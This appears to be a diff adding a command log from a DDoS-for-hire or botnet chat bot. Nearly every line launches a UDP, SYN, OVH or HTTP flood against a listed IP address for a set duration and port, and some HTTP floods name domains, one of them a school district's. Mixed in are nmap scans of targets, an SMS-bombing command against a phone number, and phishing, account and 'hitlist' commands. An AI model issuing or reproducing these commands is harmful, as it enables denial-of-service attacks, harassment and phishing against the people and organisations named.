@@ -1,0 +1,146 @@
+/ddos udp 98.203.76.244 500 dport=80
+/ddos udp 64.251.132.232 200 dport=80
+/ddos udp 98.1.36.49 200 dport=80
+/ddos udpplain 18.224.1.8 120 dport=9017
+/ddos udpplain 52.146.54.60 dport=30133
+/ddos udpplain 52.146.54.60 120 dport=30133
+/ddos udpplain 52.146.54.60 60 dport=30136
+/ddos udp 108.39.66.109 500 dport=80
+/ddos udpplain 52.154.233.174 120 dport=30224
+/ddos udpplain 3.232.55.120 120 dport=9053
+/ddos udp 73.208.173.162 dport=80
+/ddos udp 73.208.173.162 10 dport=80
+/ddos udp 73.208.173.162 60 dport=80
+/ddos udp 73.208.173.162 500 dport=80
+/ddos udp 73.208.173.162 500 dport=80
+/ddos udpplain 18.188.240.53 120 dport=9006
+/ddos udpplain 3.235.186.186 120 dport=9020
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/ddos std 104.237.208.108 80 dport=80
+/methods
+/ddos udp 104.237.208.108 60 dport=80
+/ddos udpplain 45.63.46.49 100 dport=32190
+/ddos udp 75.179.21.169 200 dport=80
+/ddos udp 108.65.66.159 200 dport=80
+/ddos udpplain 54.159.19.214 120 dport=9050
+/ddos udp 35.177.31.177 1000 dport=80
+/ddos udp 188.222.29.147 500 dport=80
+/ddos udpplain 3.22.249.88 120 dport=9066
+/ddos udp 73.208.173.162 200 dport=80
+/ddos udp 73.208.173.162 60 dport=80
+/ddos udp 71.197.31.216 1000 dport=80
+/ddos udp 137.119.146.235 500 dport=80
+/ddos udpplain 34.203.14.166 120 dport=9003
+/ddos udpplain 34.203.14.166 120 dport=9003
+/ddos udp 96.28.172.247 1200 dport=80
+/ddos udp 75.111.163.125 60 dport=80
+/ddos udp 75.111.163.125 1200 dport=80
+/ddos udpplain 18.209.21.54 120 dport=9002
+/ddos udpplain 18.209.21.54 30 dport=9002
+/checknet
+/Phish
+/Phish
+/Phish
+/Phis
+/Phish
+/ddos udpplain 3.14.81.204 120 dport=9005
+/ddos udpplain 3.14.81.204 120 dport=9005
+/ddos udpplain 3.14.81.204 120 dport=9003
+/ddos udpplain 3.15.175.19 60 dport=9047
+/Spotify
+/checkip 128.116.34.213
+/ddos udpplain 128.116.34.213 120 dport=59724
+/ddos udp 172.221.183.47 300 dport=80
+/ping 172.221.183.47
+/ddos udp 143.59.205.196 300 dport=80
+/ddos udp 128.116.34.213 120 dport=59724
+/ddos udp 24.126.112.245 300 dport=80
+/ddos udp 68.109.119.239 600 dport=80
+/ddos udp 73.4.220.109 600 dport=80
+/ddos udp 145.132.230.27 120 dport=80
+/ddos udp 173.35.227.173 120 dport=80
+/ping 173.35.227.173
+/ddos udpplain 209.206.45.213 120 dport=59004
+/ddos udp 209.206.45.213 120 dport=59004
+/ddos udpplain 128.116.4.25 40 dport52444
+/ddos udp 174.245.113.114 120 dport=80
+/ddos 174.245.113.114
+/ping 174.245.113.114:3607
+/ddos udp 166.137.107.98 120 dport=27333
+/ddos udp 73.208.173.162 10 dport=80
+/ddos udp 73.208.173.162 20 dport=80
+/tr4p
+/accounts
+/vpn
+/ddos udp 69.59.121.90 dport=80
+/ddos udp 69.59.121.90 200 dport=80
+/vpn
+/nmap 73.208.173.162
+/nmapresult
+/ddos udp 73.208.173.162 500 dport=80
+/ping 73.208.173.162
+/tr4p
+/methods
+/ddos syn 192.99.226.9 120 dport=80
+/ddos udpplain 192.99.226.9 120 dport=80
+/ddos ovh 192.99.226.9 120 dport=80
+/mega
+/ddos udp 73.208.173.162 1200 dport=80
+/ping 73.208.73.162
+/ping 73.208.173.162
+/ping 73.208.173.162
+/ping 73.208.173.162
+/ddos udp 52.252.219.19 200 dport=80
+/ddos udp 68.109.119.239 300 dport=80
+/ddos udp 69.109.119.239 120 dport=80
+/ddos udp 98.18.216.22 120 dport=80
+/ddos udp 98.18.216.22 120 dport=80
+/ping 82.100.220.42
+/ping 82.100.220.42
+/ddos http 155.254.148.43 60 domain=Valparaiso.k12.in.us conns=5000
+/ddos http 82.100.220.42 60 domain=aiqoon.de conns=5000
+/ddos http 82.100.220.42 60 domain=aiqoon.de conns=5000
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/ddos udp 73.208.173.162 1200 dport=80
+/ping 73.208.173.162
+/ddos udp 73.208.173.162 1200 dport=80
+/hitlist
+/sms
+/sms
+/tr4p
+/tr4p
+/sms
+/sms 2195081423 99999
+/ping 172.78.52.254
+/ping 172.78.52.254
+/ping 172.78.52.254
+/ping 172.78.52.254
+/plans
+/tr4p
+/accounts
+/vpn
+/vpn
+/vpn
